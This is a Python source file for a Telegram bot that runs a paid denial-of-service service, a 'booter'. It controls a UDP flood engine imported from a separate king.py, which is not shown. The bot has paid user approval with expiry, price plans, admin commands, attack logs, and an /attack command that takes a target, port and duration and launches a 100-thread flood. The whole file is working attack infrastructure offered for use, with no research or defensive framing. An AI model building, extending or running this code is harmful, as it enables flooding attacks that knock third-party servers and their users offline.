#!/usr/bin/python3
"""
ddos.py — Telegram control bot for the king UDP engine.

Wired to king.py via `from king import *`. No subprocess, no ELF binary,
no browser gate.
"""

import datetime
import os
import threading

import telebot

from king import attack, start_attack  # noqa: F401  (attack re-exported for callers)

bot = telebot.TeleBot(os.environ.get("BOT_TOKEN", ""))

BASE_DIR = os.path.dirname(os.path.abspath(__file__))

# Admin user IDs
admin_id = ["8789271943"]

USER_FILE = os.path.join(BASE_DIR, "users.txt")
LOG_FILE = os.path.join(BASE_DIR, "log.txt")

# In-memory approval expiry: user_id -> datetime
user_approval_expiry = {}

# Per-user cooldown timestamps
bgmi_cooldown = {}
COOLDOWN_TIME = 0  # seconds; 0 = no cooldown


# ── file-backed user store ────────────────────────────────────────────────

def read_users():
    try:
        with open(USER_FILE, "r") as f:
            return [line.strip() for line in f.read().splitlines() if line.strip()]
    except FileNotFoundError:
        return []


def save_users():
    with open(USER_FILE, "w") as f:
        for uid in allowed_user_ids:
            f.write(f"{uid}\n")


allowed_user_ids = read_users()


# ── logging ───────────────────────────────────────────────────────────────

def log_command(user_id, target, port, duration):
    try:
        user_info = bot.get_chat(user_id)
        username = f"@{user_info.username}" if user_info.username else f"UserID: {user_id}"
    except Exception:
        username = f"UserID: {user_id}"

    with open(LOG_FILE, "a") as f:
        f.write(f"Username: {username}\nTarget: {target}\nPort: {port}\nTime: {duration}\n\n")


def record_command_logs(user_id, command, target=None, port=None, duration=None):
    entry = f"UserID: {user_id} | Time: {datetime.datetime.now()} | Command: {command}"
    if target:
        entry += f" | Target: {target}"
    if port:
        entry += f" | Port: {port}"
    if duration:
        entry += f" | Time: {duration}"
    with open(LOG_FILE, "a") as f:
        f.write(entry + "\n")


# ── approval expiry ───────────────────────────────────────────────────────

def get_remaining_approval_time(user_id):
    expiry = user_approval_expiry.get(user_id)
    if not expiry:
        return "N/A"
    remaining = expiry - datetime.datetime.now()
    if remaining.total_seconds() < 0:
        return "Expired"
    return str(remaining)


def set_approval_expiry_date(user_id, duration, time_unit):
    now = datetime.datetime.now()
    unit = time_unit.lower()
    if unit in ("hour", "hours"):
        expiry = now + datetime.timedelta(hours=duration)
    elif unit in ("day", "days"):
        expiry = now + datetime.timedelta(days=duration)
    elif unit in ("week", "weeks"):
        expiry = now + datetime.timedelta(weeks=duration)
    elif unit in ("month", "months"):
        expiry = now + datetime.timedelta(days=30 * duration)
    else:
        return False
    user_approval_expiry[user_id] = expiry
    return True


# ── /add ──────────────────────────────────────────────────────────────────

@bot.message_handler(commands=["add"])
def add_user(message):
    user_id = str(message.chat.id)
    if user_id not in admin_id:
        bot.reply_to(message, "Not authorized.")
        return

    parts = message.text.split()
    if len(parts) <= 2:
        bot.reply_to(message, "Usage: /add <user_id> <duration>  (e.g. 1hour, 2days, 3weeks, 4months)")
        return

    user_to_add, duration_str = parts[1], parts[2]

    try:
        duration = int(duration_str[:-4])
        if duration <= 0:
            raise ValueError
        time_unit = duration_str[-4:].lower()
        if time_unit not in ("hour", "hours", "day", "days",
                             "week", "weeks", "month", "months"):
            raise ValueError
    except ValueError:
        bot.reply_to(message, "Invalid duration. Use e.g. 1hour, 2days, 3weeks, 4months.")
        return

    if user_to_add in allowed_user_ids:
        bot.reply_to(message, "User already exists.")
        return

    allowed_user_ids.append(user_to_add)
    save_users()

    if set_approval_expiry_date(user_to_add, duration, time_unit):
        expiry = user_approval_expiry[user_to_add].strftime("%Y-%m-%d %H:%M:%S")
        bot.reply_to(message, f"User {user_to_add} added for {duration} {time_unit}. Expires {expiry}.")
    else:
        bot.reply_to(message, "Failed to set expiry.")


# ── /remove ───────────────────────────────────────────────────────────────

@bot.message_handler(commands=["remove"])
def remove_user(message):
    user_id = str(message.chat.id)
    if user_id not in admin_id:
        bot.reply_to(message, "Not authorized.")
        return

    parts = message.text.split()
    if len(parts) <= 1:
        bot.reply_to(message, "Usage: /remove <user_id>")
        return

    user_to_remove = parts[1]
    if user_to_remove not in allowed_user_ids:
        bot.reply_to(message, f"User {user_to_remove} not found.")
        return

    allowed_user_ids.remove(user_to_remove)
    user_approval_expiry.pop(user_to_remove, None)
    bgmi_cooldown.pop(user_to_remove, None)
    save_users()
    bot.reply_to(message, f"User {user_to_remove} removed.")


# ── /myinfo ───────────────────────────────────────────────────────────────

@bot.message_handler(commands=["myinfo"])
def get_user_info(message):
    user_id = str(message.chat.id)
    try:
        user_info = bot.get_chat(user_id)
        username = user_info.username or "N/A"
    except Exception:
        username = "N/A"

    role = "Admin" if user_id in admin_id else "User"
    remaining = get_remaining_approval_time(user_id)
    expiry = user_approval_expiry.get(user_id, "Not Approved")

    text = (
        f"👤 Your Info:\n\n"
        f"🆔 User ID: <code>{user_id}</code>\n"
        f"📝 Username: {username}\n"
        f"🔖 Role: {role}\n"
        f"📅 Approval Expiry: {expiry}\n"
        f"⏳ Remaining: {remaining}"
    )
    bot.reply_to(message, text, parse_mode="HTML")


# ── /clearlogs ────────────────────────────────────────────────────────────

@bot.message_handler(commands=["clearlogs"])
def clear_logs_command(message):
    user_id = str(message.chat.id)
    if user_id not in admin_id:
        bot.reply_to(message, "Not authorized.")
        return

    try:
        with open(LOG_FILE, "r+") as f:
            if not f.read().strip():
                bot.reply_to(message, "Logs already cleared.")
                return
            f.seek(0)
            f.truncate(0)
        bot.reply_to(message, "Logs cleared.")
    except FileNotFoundError:
        bot.reply_to(message, "No logs to clear.")


# ── /clearusers ───────────────────────────────────────────────────────────

@bot.message_handler(commands=["clearusers"])
def clear_users_command(message):
    user_id = str(message.chat.id)
    if user_id not in admin_id:
        bot.reply_to(message, "Not authorized.")
        return

    allowed_user_ids.clear()
    user_approval_expiry.clear()
    bgmi_cooldown.clear()
    save_users()
    bot.reply_to(message, "Users cleared.")


# ── /allusers ─────────────────────────────────────────────────────────────

@bot.message_handler(commands=["allusers"])
def show_all_users(message):
    user_id = str(message.chat.id)
    if user_id not in admin_id:
        bot.reply_to(message, "Not authorized.")
        return

    if not allowed_user_ids:
        bot.reply_to(message, "No users.")
        return

    lines = ["Authorized Users:"]
    for uid in allowed_user_ids:
        try:
            info = bot.get_chat(int(uid))
            lines.append(f"- @{info.username} (ID: {uid})")
        except Exception:
            lines.append(f"- User ID: {uid}")
    bot.reply_to(message, "\n".join(lines))


# ── /logs ─────────────────────────────────────────────────────────────────

@bot.message_handler(commands=["logs"])
def show_recent_logs(message):
    user_id = str(message.chat.id)
    if user_id not in admin_id:
        bot.reply_to(message, "Not authorized.")
        return

    if not os.path.exists(LOG_FILE) or os.path.getsize(LOG_FILE) == 0:
        bot.reply_to(message, "No data found.")
        return

    with open(LOG_FILE, "rb") as f:
        bot.send_document(message.chat.id, f)


# ── /mylogs ───────────────────────────────────────────────────────────────

@bot.message_handler(commands=["mylogs"])
def show_command_logs(message):
    user_id = str(message.chat.id)
    if user_id not in allowed_user_ids:
        bot.reply_to(message, "Not authorized.")
        return

    try:
        with open(LOG_FILE, "r") as f:
            lines = [ln for ln in f.readlines() if f"UserID: {user_id}" in ln]
    except FileNotFoundError:
        bot.reply_to(message, "No logs.")
        return

    if not lines:
        bot.reply_to(message, "No command logs found.")
        return

    bot.reply_to(message, "Your Command Logs:\n" + "".join(lines))


# ── /attack ───────────────────────────────────────────────────────────────

def start_attack_reply(message, target, port, duration):
    user_info = message.from_user
    username = user_info.username or user_info.first_name

    text = (
        f"{username}, ATTACK STARTED.\n\n"
        f"Target: {target}\n"
        f"Port:   {port}\n"
        f"Time:   {duration} seconds"
    )
    bot.reply_to(message, text)


@bot.message_handler(commands=["attack"])
def handle_attack(message):
    user_id = str(message.chat.id)

    if user_id not in allowed_user_ids:
        bot.reply_to(message, "Unauthorized.")
        return

    # Cooldown (admin bypass)
    if user_id not in admin_id and COOLDOWN_TIME > 0:
        last = bgmi_cooldown.get(user_id)
        if last and (datetime.datetime.now() - last).total_seconds() < COOLDOWN_TIME:
            remaining = COOLDOWN_TIME - int((datetime.datetime.now() - last).total_seconds())
            bot.reply_to(message, f"Cooldown. Wait {remaining}s.")
            return

    parts = message.text.split()
    if len(parts) != 4:
        bot.reply_to(message, "Usage: /attack <target> <port> <time_seconds>")
        return

    try:
        target = parts[1]
        port = int(parts[2])
        duration = int(parts[3])
    except ValueError:
        bot.reply_to(message, "Port and time must be integers.")
        return

    if duration <= 0 or duration > 1000:
        bot.reply_to(message, "Time must be 1–1000 seconds.")
        return

    if not (0 < port < 65536):
        bot.reply_to(message, "Port must be 1–65535.")
        return

    if user_id not in admin_id:
        bgmi_cooldown[user_id] = datetime.datetime.now()

    record_command_logs(user_id, "/attack", target, port, duration)
    log_command(user_id, target, port, duration)
    start_attack_reply(message, target, port, duration)

    # Fire the attack in a background thread — handler returns immediately,
    # bot stays responsive to other users during the attack window.
    try:
        start_attack(target, port, duration, threads=100)
    except (ValueError, RuntimeError) as e:
        bot.reply_to(message, f"Attack failed: {e}")


# ── /help ─────────────────────────────────────────────────────────────────

@bot.message_handler(commands=["help"])
def show_help(message):
    text = (
        "Available commands:\n"
        "/attack  — start an attack\n"
        "/rules   — read rules\n"
        "/mylogs  — your recent attacks\n"
        "/plan    — pricing\n"
        "/myinfo  — your account info\n"
        "/admincmd — admin commands"
    )
    bot.reply_to(message, text)


# ── /start, /rules, /plan ─────────────────────────────────────────────────

@bot.message_handler(commands=["start"])
def welcome_start(message):
    name = message.from_user.first_name
    bot.reply_to(
        message,
        f"Welcome, {name}. Run /help for commands.",
    )


@bot.message_handler(commands=["rules"])
def welcome_rules(message):
    name = message.from_user.first_name
    bot.reply_to(
        message,
        f"{name}, rules:\n"
        "1. Don't spam attacks.\n"
        "2. One attack at a time.\n"
        "3. Follow the channel.\n"
        "4. Logs are checked daily.",
    )


@bot.message_handler(commands=["plan"])
def welcome_plan(message):
    name = message.from_user.first_name
    bot.reply_to(
        message,
        f"{name}, plans:\n\n"
        "VIP:\n"
        "  Attack time:  300s\n"
        "  Cooldown:     10s\n"
        "  Concurrents:  5\n\n"
        "Prices:\n"
        "  3 days — 200\n"
        "  Week   — 300\n"
        "  Month  — 500",
    )


# ── /admincmd ─────────────────────────────────────────────────────────────

@bot.message_handler(commands=["admincmd"])
def show_admin_commands(message):
    name = message.from_user.first_name
    bot.reply_to(
        message,
        f"{name}, admin commands:\n"
        "/add <user_id> <duration>\n"
        "/remove <user_id>\n"
        "/allusers\n"
        "/logs\n"
        "/broadcast <msg>\n"
        "/clearlogs\n"
        "/clearusers",
    )


# ── /broadcast ────────────────────────────────────────────────────────────

@bot.message_handler(commands=["broadcast"])
def broadcast_message(message):
    user_id = str(message.chat.id)
    if user_id not in admin_id:
        bot.reply_to(message, "Not authorized.")
        return

    parts = message.text.split(maxsplit=1)
    if len(parts) < 2:
        bot.reply_to(message, "Usage: /broadcast <message>")
        return

    text = "Message from admin:\n\n" + parts[1]
    sent = 0
    failed = 0
    for uid in list(allowed_user_ids):
        try:
            bot.send_message(uid, text)
            sent += 1
        except Exception:
            failed += 1

    bot.reply_to(message, f"Broadcast sent: {sent}, failed: {failed}.")


# ── boot ──────────────────────────────────────────────────────────────────

if __name__ == "__main__":
    bot.infinity_polling(skip_pending=True, timeout=30)
